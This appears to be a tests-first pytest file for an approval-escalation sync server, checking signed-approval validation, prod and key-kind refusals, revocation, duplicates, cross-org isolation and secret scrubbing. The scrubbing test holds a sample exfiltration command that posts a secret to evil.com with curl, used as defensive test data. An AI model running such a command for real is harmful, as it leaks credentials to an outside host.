"""T12 ee tests-first: escalation upload, decisions, server-side approval
validation, through the real agg_cp app with Postgres.

Interface contract (pinned -- the build removes only xfail markers)
-------------------------------------------------------------------
Server routes (agg_cp.sync.escalations):

    POST /api/v1/sync/escalations
        Auth: device token (Authorization: Bearer <token>).
        Body: {device_id: str, request_id: str, record: {...},
               policy_sequence: int}
        Idempotent on (device_id, request_id).
        Scrubs the record before storage.
        Stores current policy_sequence.
        200: {escalation_id: uuid}
        409: duplicate (same device_id + request_id, already exists)
        401: revoked device

    GET /api/v1/sync/decisions?cursor=
        Auth: device token.
        Returns approvals/denies for this device's escalations since cursor.
        200: {decisions: [...], cursor: str}

    POST /api/v1/sync/escalations/{escalation_id}/approvals
        Auth: user session (signer token or browser session).
        Body: envelope (agg/remote-approval/v1), user-signed.
        Server checks:
          - Signature verification
          - Key in registry with approver role
          - Device/bundle-signer key refused
          - Prod approval refused (any key kind)
          - Wrong field set refused
          - not_after expiry (with injected clock)
          - unique (escalation_id, user_id)
        200: {approval_id: uuid}
        400: validation error
        403: prod / wrong kind
        409: duplicate (same escalation + user)

    Cross-org RLS: another org's device cannot see or modify escalations.

Schema tables (from 0007_m2_tables.py):
    escalations: id, org_id, project_id, connector_id, request_id,
                 record, risk, requires_dual, status, policy_sequence,
                 created_at
                 UNIQUE (connector_id, request_id)
    approvals:   id, org_id, escalation_id, user_id, key_id, decision,
                 signed_payload, signature, nonce, not_after,
                 registry_version, kind, created_at
                 UNIQUE (escalation_id, user_id)

Uses the T5 tables via ee conftest fixtures (pg_url, pg_roles, owner_url,
app_url).

RED tests xfail on M2T12Pending.  Guards verify the T5 schema baseline.

Node-id patterns follow M2_BASELINE.md section 5:
  31 -> test_device_key_approval_refused_server, test_bundle_signer_key_approval_refused_server
  36 -> test_prod_approval_refused_server

Threat coverage (server side): 13 (forged approval), 14 (same user),
19 (scrubbed upload), 27 (local+remote), 28 (operator excluded),
31 (device/bundle-signer refused), 36 (prod refused).
"""
from __future__ import annotations

import hashlib
import json
import secrets
import time
import uuid

import psycopg
import pytest
from nacl.signing import SigningKey

from .m2_pending import M2T12Pending
from .m2_sync_server import (
    make_sync_server, ensure_at_head, create_org, create_project,
    keygen, sign_envelope, canonical_json,
)
from .t8p2_helpers import (
    seed_org_with_oidc, seed_user, seed_admin_binding,
    make_test_app,
)
from .t9_helpers import seed_session, make_session_cookie
from .fake_idp import FakeClock


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _need(module: str, attr: str) -> None:
    """Raise M2T12Pending if *module*.*attr* is absent."""
    try:
        mod = __import__(module, fromlist=[attr])
    except ImportError:
        raise M2T12Pending(f"{module} not importable")
    if not hasattr(mod, attr):
        raise M2T12Pending(f"{module}.{attr} not found")


def _conninfo(url: str) -> str:
    return url.replace("+psycopg", "")


def _seed_connector(owner_url: str, org_id: str, project_id: str,
                    pub_key: bytes, *, device_id: str | None = None,
                    operator_user_id: str | None = None,
                    ) -> str:
    """Insert a connectors row directly (superuser) and return device_id."""
    did = device_id or str(uuid.uuid4())
    kid = hashlib.sha256(pub_key).hexdigest()
    conninfo = _conninfo(owner_url)
    with psycopg.connect(conninfo) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [org_id])
        conn.execute(
            "INSERT INTO connectors "
            "(id, org_id, project_id, device_public_key, created_at) "
            "VALUES (%s, %s, %s, %s, now()) ON CONFLICT DO NOTHING",
            [did, org_id, project_id, pub_key.hex()],
        )
        conn.commit()
    return did


def _seed_device_token(owner_url: str, org_id: str, project_id: str,
                       connector_id: str, token: str) -> str:
    """Insert a device_tokens row and return the token."""
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    conninfo = _conninfo(owner_url)
    with psycopg.connect(conninfo) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [org_id])
        conn.execute(
            "INSERT INTO device_tokens "
            "(id, org_id, project_id, connector_id, token_hash, "
            "expires_at, created_at) "
            "VALUES (%s, %s, %s, %s, %s, now() + interval '10 min', now())",
            [str(uuid.uuid4()), org_id, project_id, connector_id, token_hash],
        )
        conn.commit()
    return token


def _seed_revoked_connector(owner_url: str, org_id: str, project_id: str,
                            pub_key: bytes) -> tuple[str, str]:
    """Seed a revoked connector and return (device_id, token)."""
    did = str(uuid.uuid4())
    kid = hashlib.sha256(pub_key).hexdigest()
    token = secrets.token_hex(32)
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    conninfo = _conninfo(owner_url)
    with psycopg.connect(conninfo) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [org_id])
        conn.execute(
            "INSERT INTO connectors "
            "(id, org_id, project_id, device_public_key, revoked_at, created_at) "
            "VALUES (%s, %s, %s, %s, now(), now()) ON CONFLICT DO NOTHING",
            [did, org_id, project_id, pub_key.hex()],
        )
        conn.execute(
            "INSERT INTO device_tokens "
            "(id, org_id, project_id, connector_id, token_hash, "
            "expires_at, created_at) "
            "VALUES (%s, %s, %s, %s, %s, now() + interval '10 min', now())",
            [str(uuid.uuid4()), org_id, project_id, did, token_hash],
        )
        conn.commit()
    return did, token


def _make_remote_approval_payload(
    sk, *,
    request_id: str,
    command: str = "echo test",
    org_id: str, project_id: str, device_id: str,
    registry_version: int = 1,
    policy_sequence: int = 1,
    user_id: str,
    nonce: str | None = None,
    not_after: float | None = None,
) -> dict:
    """Build an agg/remote-approval/v1 envelope for server submission."""
    pub = bytes(sk.verify_key)
    kid = hashlib.sha256(pub).hexdigest()
    fp = hashlib.sha256(command.encode()).hexdigest()
    payload = {
        "request_id": request_id,
        "command": command,
        "fingerprint": fp,
        "reviewer_id": user_id,
        "decision": "approve",
        "approved_at": time.time(),
        "org_id": org_id,
        "project_id": project_id,
        "device_id": device_id,
        "registry_version": registry_version,
        "policy_sequence": policy_sequence,
        "user_id": user_id,
        "key_id": kid,
        "nonce": nonce or secrets.token_hex(16),
        "not_after": not_after or (time.time() + 900),
    }
    return sign_envelope("agg/remote-approval/v1", payload, sk)


def _seed_registry_with_keys(owner_url: str, org_id: str,
                             key_entries: list[dict]) -> int:
    """Insert a registry version with the given keys. Returns version."""
    conninfo = _conninfo(owner_url)
    with psycopg.connect(conninfo) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [org_id])
        conn.execute(
            "INSERT INTO key_registry_versions "
            "(id, org_id, version, payload, signature, created_at) "
            "VALUES (%s, %s, 1, %s, 'placeholder', now()) "
            "ON CONFLICT DO NOTHING",
            [str(uuid.uuid4()), org_id, json.dumps({"keys": key_entries})],
        )
        # Insert approver_keys for each entry
        for entry in key_entries:
            conn.execute(
                "INSERT INTO approver_keys "
                "(id, org_id, user_id, key_id, public_key, kind, roles, "
                "registry_version, created_at) "
                "VALUES (%s, %s, %s, %s, %s, %s, %s, 1, now()) "
                "ON CONFLICT DO NOTHING",
                [str(uuid.uuid4()), org_id, entry["user_id"],
                 entry["key_id"], entry["public_key"], entry["kind"],
                 json.dumps(entry.get("roles", ["approver"]))],
            )
        conn.commit()
    return 1


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def escalation_server(pg_url, app_url, owner_url, pg_roles):
    """4-worker agg_cp server with 2 orgs for escalation tests."""
    yield from make_sync_server(
        pg_url, app_url, owner_url,
        org_names=["Escalation Org", "Evil Org"],
    )


# ===================================================================
# Guards: schema baseline
# ===================================================================


@pytest.mark.pg
def test_guard_escalations_table_exists(pg_url, pg_roles, owner_url):
    """Guard: escalations table exists in the schema."""
    ensure_at_head(pg_url)
    with psycopg.connect(_conninfo(owner_url)) as conn:
        row = conn.execute(
            "SELECT 1 FROM information_schema.tables "
            "WHERE table_name = 'escalations'"
        ).fetchone()
        assert row is not None, "escalations table missing"


@pytest.mark.pg
def test_guard_approvals_table_exists(pg_url, pg_roles, owner_url):
    """Guard: approvals table exists in the schema."""
    ensure_at_head(pg_url)
    with psycopg.connect(_conninfo(owner_url)) as conn:
        row = conn.execute(
            "SELECT 1 FROM information_schema.tables "
            "WHERE table_name = 'approvals'"
        ).fetchone()
        assert row is not None, "approvals table missing"


@pytest.mark.pg
def test_guard_escalations_unique_constraint(pg_url, pg_roles, owner_url):
    """Guard: escalations has UNIQUE (connector_id, request_id)."""
    ensure_at_head(pg_url)
    with psycopg.connect(_conninfo(owner_url)) as conn:
        row = conn.execute(
            "SELECT 1 FROM pg_indexes "
            "WHERE tablename = 'escalations' "
            "AND indexdef LIKE '%connector_id%request_id%'"
        ).fetchone()
        assert row is not None, "UNIQUE (connector_id, request_id) missing"


@pytest.mark.pg
def test_guard_approvals_unique_constraint(pg_url, pg_roles, owner_url):
    """Guard: approvals has UNIQUE (escalation_id, user_id)."""
    ensure_at_head(pg_url)
    with psycopg.connect(_conninfo(owner_url)) as conn:
        row = conn.execute(
            "SELECT 1 FROM pg_indexes "
            "WHERE tablename = 'approvals' "
            "AND indexdef LIKE '%escalation_id%user_id%'"
        ).fetchone()
        assert row is not None, "UNIQUE (escalation_id, user_id) missing"


# ===================================================================
# RED: POST /api/v1/sync/escalations (D6.1)
# ===================================================================


@pytest.mark.pg

def test_escalation_upload_success(escalation_server):
    """Upload a pending escalation (D6.1, D7.2)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-1",
            "record": {"command": "echo test", "status": "pending"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    data = r.json()
    assert "escalation_id" in data


@pytest.mark.pg

def test_escalation_upload_idempotent(escalation_server):
    """Uploading the same (device_id, request_id) is idempotent (D6.1)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    body = {
        "device_id": device_id,
        "request_id": "req-idempotent-1",
        "record": {"command": "echo test"},
        "policy_sequence": 1,
    }

    r1 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json=body,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r1.status_code == 200

    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json=body,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    # Idempotent: either 200 or 409
    assert r2.status_code in (200, 409)


@pytest.mark.pg

def test_escalation_stores_policy_sequence(escalation_server):
    """The escalation stores the current policy_sequence (D6.1)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-seq-1",
            "record": {"command": "echo test"},
            "policy_sequence": 42,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    # Verify the sequence was stored
    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        row = conn.execute(
            "SELECT policy_sequence FROM escalations WHERE id = %s",
            [esc_id],
        ).fetchone()
        assert row is not None
        assert row[0] == 42


# ===================================================================
# RED: GET /api/v1/sync/decisions (D6.1, D7.2)
# ===================================================================


@pytest.mark.pg

def test_decisions_endpoint_returns_empty(escalation_server):
    """GET /api/v1/sync/decisions returns empty when no decisions (D7.2)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    r = httpx.get(
        f"{info['base_url']}/api/v1/sync/decisions",
        params={"cursor": ""},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    data = r.json()
    assert "decisions" in data
    assert isinstance(data["decisions"], list)


# ===================================================================
# RED: server refuses device-key approval (threat 31)
# ===================================================================


@pytest.mark.pg

def test_device_key_approval_refused_server(escalation_server):
    """Server refuses a device-key signed approval (D5.1, threat 31, REVIEW_M2 item 7)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    device_sk, device_pub, device_kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload an escalation first
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-devkey-srv-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    # Try to approve with the device key
    approval = _make_remote_approval_payload(
        device_sk,
        request_id="req-devkey-srv-1",
        org_id=info["org_id"], project_id=project_id,
        device_id=device_id, user_id="device-owner",
    )

    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=approval,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    # Server must refuse: 400 or 403
    assert r2.status_code in (400, 403)


# ===================================================================
# RED: server refuses bundle-signer-key approval (threat 31)
# ===================================================================


@pytest.mark.pg

def test_bundle_signer_key_approval_refused_server(escalation_server):
    """Server refuses a bundle-signer-key signed approval (D5.1, threat 31)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    bs_sk, bs_pub, bs_kid = keygen()
    device_sk, device_pub, device_kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        # Seed the bundle-signer key in the registry
        _seed_registry_with_keys(info["owner_url"], info["org_id"], [
            {"key_id": bs_kid, "public_key": bs_pub.hex(),
             "user_id": "bundle-signer", "kind": "bundle-signer",
             "roles": []},
        ])
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload an escalation
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-bskey-srv-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    # Try to approve with the bundle-signer key
    approval = _make_remote_approval_payload(
        bs_sk,
        request_id="req-bskey-srv-1",
        org_id=info["org_id"], project_id=project_id,
        device_id=device_id, user_id="bundle-signer",
    )

    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=approval,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r2.status_code in (400, 403)


# ===================================================================
# RED: server refuses prod approval (threat 36)
# ===================================================================


@pytest.mark.pg

def test_prod_approval_refused_server(escalation_server):
    """Server refuses any remote approval on a prod project (N9, threat 36)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    bob_sk, bob_pub, bob_kid = keygen()
    device_sk, device_pub, device_kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        # Create a prod project
        create_project(conn, info["org_id"], project_id, environment="prod")
        _seed_registry_with_keys(info["owner_url"], info["org_id"], [
            {"key_id": bob_kid, "public_key": bob_pub.hex(),
             "user_id": "user-bob", "kind": "cli",
             "roles": ["approver"]},
        ])
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload an escalation
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-prod-srv-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    approval = _make_remote_approval_payload(
        bob_sk,
        request_id="req-prod-srv-1",
        org_id=info["org_id"], project_id=project_id,
        device_id=device_id, user_id="user-bob",
    )

    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=approval,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r2.status_code in (400, 403)


# ===================================================================
# RED: wrong field set refused (D5.6)
# ===================================================================


@pytest.mark.pg

def test_wrong_field_set_refused_server(escalation_server):
    """Server refuses an approval with missing required fields (D5.6)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    bob_sk, bob_pub, bob_kid = keygen()
    device_sk, device_pub, device_kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        _seed_registry_with_keys(info["owner_url"], info["org_id"], [
            {"key_id": bob_kid, "public_key": bob_pub.hex(),
             "user_id": "user-bob", "kind": "cli",
             "roles": ["approver"]},
        ])
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload an escalation
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-fieldset-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    # Incomplete approval: missing policy_sequence, nonce, not_after
    incomplete = sign_envelope("agg/remote-approval/v1", {
        "request_id": "req-fieldset-1",
        "decision": "approve",
        "user_id": "user-bob",
    }, bob_sk)

    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=incomplete,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r2.status_code == 400


# ===================================================================
# RED: cross-org RLS (threat 5 + 29)
# ===================================================================


@pytest.mark.pg

def test_cross_org_escalation_refused(escalation_server):
    """A device from org A cannot see or create escalations in org B (RLS)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()

    # Create project in main org
    project_id = str(uuid.uuid4())
    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    # Create device in evil org
    evil_project_id = str(uuid.uuid4())
    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_evil"]])
        create_project(conn, info["org_evil"], evil_project_id, environment="staging")
        conn.commit()

    evil_device_id = _seed_connector(info["owner_url"], info["org_evil"],
                                      evil_project_id, pub)
    evil_token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_evil"], evil_project_id,
                       evil_device_id, evil_token)

    # Try to create an escalation in the main org's project
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": evil_device_id,
            "request_id": "req-crossorg-1",
            "record": {"command": "echo evil"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {evil_token}"},
        timeout=10.0,
    )
    # The device is in evil org, so it should only see its own org's data
    # Depending on implementation: 200 but scoped to evil org, or 404/403
    if r.status_code == 200:
        # If created, verify it's in evil org not main org
        with psycopg.connect(_conninfo(info["owner_url"])) as conn:
            conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
            row = conn.execute(
                "SELECT 1 FROM escalations WHERE connector_id = %s",
                [evil_device_id],
            ).fetchone()
            # RLS on main org should not see evil org's escalation
            assert row is None


# ===================================================================
# RED: expired not_after refused by server (D4.1)
# ===================================================================


@pytest.mark.pg

def test_expired_not_after_refused_server(escalation_server):
    """Server refuses an approval with expired not_after (D4.1)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    bob_sk, bob_pub, bob_kid = keygen()
    device_sk, device_pub, device_kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        _seed_registry_with_keys(info["owner_url"], info["org_id"], [
            {"key_id": bob_kid, "public_key": bob_pub.hex(),
             "user_id": "user-bob", "kind": "cli",
             "roles": ["approver"]},
        ])
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload escalation
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-expired-srv-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    # Approval with expired not_after (past + beyond grace)
    approval = _make_remote_approval_payload(
        bob_sk,
        request_id="req-expired-srv-1",
        org_id=info["org_id"], project_id=project_id,
        device_id=device_id, user_id="user-bob",
        not_after=time.time() - 300,  # 5 min ago
    )

    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=approval,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r2.status_code in (400, 403)


# ===================================================================
# RED: revoked device 401 (D1.5)
# ===================================================================


@pytest.mark.pg

def test_revoked_device_escalation_401(escalation_server):
    """A revoked device gets 401 on escalation upload (D1.5)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id, revoked_token = _seed_revoked_connector(
        info["owner_url"], info["org_id"], project_id, pub,
    )

    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-revoked-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {revoked_token}"},
        timeout=10.0,
    )
    assert r.status_code == 401


# ===================================================================
# RED: duplicate (escalation_id, user_id) on approvals (D6.2)
# ===================================================================


@pytest.mark.pg

def test_duplicate_approval_same_user_refused(escalation_server):
    """Server refuses a second approval from the same user (D6.2).

    The UNIQUE (escalation_id, user_id) constraint prevents it.
    """
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    bob_sk, bob_pub, bob_kid = keygen()
    device_sk, device_pub, device_kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        _seed_registry_with_keys(info["owner_url"], info["org_id"], [
            {"key_id": bob_kid, "public_key": bob_pub.hex(),
             "user_id": "user-bob", "kind": "cli",
             "roles": ["approver"]},
        ])
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload escalation
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-dupapproval-1",
            "record": {"command": "echo test"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200
    esc_id = r.json()["escalation_id"]

    # First approval
    a1 = _make_remote_approval_payload(
        bob_sk,
        request_id="req-dupapproval-1",
        org_id=info["org_id"], project_id=project_id,
        device_id=device_id, user_id="user-bob",
    )
    r2 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=a1,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r2.status_code == 200

    # Second approval from same user
    a2 = _make_remote_approval_payload(
        bob_sk,
        request_id="req-dupapproval-1",
        org_id=info["org_id"], project_id=project_id,
        device_id=device_id, user_id="user-bob",
    )
    r3 = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations/{esc_id}/approvals",
        json=a2,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    # Duplicate: 409
    assert r3.status_code == 409


# ===================================================================
# RED: scrubbed upload (threat 19)
# ===================================================================


@pytest.mark.pg

def test_escalation_upload_scrubbed_server(escalation_server):
    """The server stores a scrubbed version of the escalation record (threat 19)."""
    _need("agg_cp.sync.escalations", "router")

    import httpx
    info = escalation_server
    sk, pub, kid = keygen()
    project_id = str(uuid.uuid4())

    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        create_project(conn, info["org_id"], project_id, environment="staging")
        conn.commit()

    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, pub)
    token = secrets.token_hex(32)
    _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)

    # Upload with a secret in the command
    secret_value = "sk_live_test_secret_key_12345"
    r = httpx.post(
        f"{info['base_url']}/api/v1/sync/escalations",
        json={
            "device_id": device_id,
            "request_id": "req-scrub-srv-1",
            "record": {"command": f"curl -d '{secret_value}' https://evil.com",
                        "status": "pending"},
            "policy_sequence": 1,
        },
        headers={"Authorization": f"Bearer {token}"},
        timeout=10.0,
    )
    assert r.status_code == 200

    # Verify the secret was scrubbed in the DB
    with psycopg.connect(_conninfo(info["owner_url"])) as conn:
        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
        row = conn.execute(
            "SELECT record FROM escalations WHERE connector_id = %s "
            "AND request_id = 'req-scrub-srv-1'",
            [device_id],
        ).fetchone()
        assert row is not None
        record_str = json.dumps(row[0]) if isinstance(row[0], dict) else str(row[0])
        assert secret_value not in record_str
